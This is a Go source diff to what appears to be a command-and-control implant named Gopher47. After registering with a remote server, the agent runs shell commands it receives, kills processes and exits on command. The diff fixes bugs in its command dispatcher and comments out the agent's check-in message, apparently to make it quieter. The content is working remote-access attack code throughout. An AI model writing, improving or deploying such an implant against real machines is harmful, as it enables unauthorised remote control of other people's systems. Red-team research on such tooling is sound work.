@@ -140,20 +140,23 @@ func RunCommand(command string) string {
 	output := ""
 	//fmt.Printf(" [*] Command: ")
 	//fmt.Println([]byte(command))
-	val := strings.Split(command, " ")[0]
 	cmdArgs := strings.Fields(command)
 	//fmt.Println([]byte(command))
-	switch (utils.Strip(val)){
+	switch (utils.Strip(cmdArgs[0])){
 	case "shell":
-		output = functions.Shell(cmdArgs[1:])
+		if len(cmdArgs) < 2 {
+			output = "[!] Insufficient arguments"
+		} else {
+			output = functions.Shell(cmdArgs[1:])
+		}
 	case "o7":
 		os.Exit(2)
 	case "kill":
 		pid, err := strconv.Atoi(cmdArgs[1])
 		if (err != nil) {
-			output = functions.Kill(pid).Error()
+			output = "[!] Golang Error: " + string(err.Error())
 		} else {
-			output = "[!] Golang Error: " + err.Error()
+			output = string(functions.Kill(pid).Error())
 		}
 	}
 
@@ -170,7 +173,7 @@ func main(){
 		registered = registerAgent(url, magicBytes, agentId)
 		time.Sleep((time.Duration(5) * time.Second))
 	}
-	fmt.Println("[+] Gopher47 has checked in!")
+	//fmt.Println("[+] Gopher47 has checked in!")
 
 	command := ""
 	out := ""
